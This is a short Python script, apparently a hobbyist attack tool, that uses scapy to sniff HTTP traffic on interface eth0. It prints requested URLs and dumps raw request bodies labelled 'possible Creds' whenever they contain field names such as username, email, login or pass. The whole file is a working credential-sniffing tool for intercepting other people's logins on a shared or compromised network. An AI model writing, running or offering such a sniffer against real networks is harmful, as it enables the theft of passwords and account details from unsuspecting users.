#!usr/bin/env python3
#packet sniffer

import scapy.all as sc
from scapy.layers import http


def sniff(interface):
    print('Starting packet sniffer...\n')
    sc.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(pkt):
    url_path = pkt[http.HTTPRequest].Path
    url_host = pkt[http.HTTPRequest].Host
    bytes_url = url_host+url_path
    return bytes_url.decode('utf-8')


def raw_data(pkt):
    input_field_options = ['uname','username','email','login','pass','password','urname','ucc',]
    
    if pkt.haslayer(sc.Raw):
        load = pkt[sc.Raw].load
        #print(type(load))
        print("\nRaw data, possible Creds >>",load,'\n')
        load = load.decode('utf-8')
        for option in input_field_options:
            if option in load:
                #print(load_decode)
                return "\nRaw data, possible Creds >>", load


def process_sniffed_packet(pkt):
    if pkt.haslayer(http.HTTPRequest):
        url = get_url(pkt)
        if ('ocsp' not in url) and ('lencr' not in url) and ('trust' not in url) and ('daddy' not in url) and ('rapid' not in url):
            print("[+] Request URL >>", url)
            raw_data_cred = raw_data(pkt)
            if raw_data_cred:
                print(raw_data(pkt))
            
        
sniff('eth0')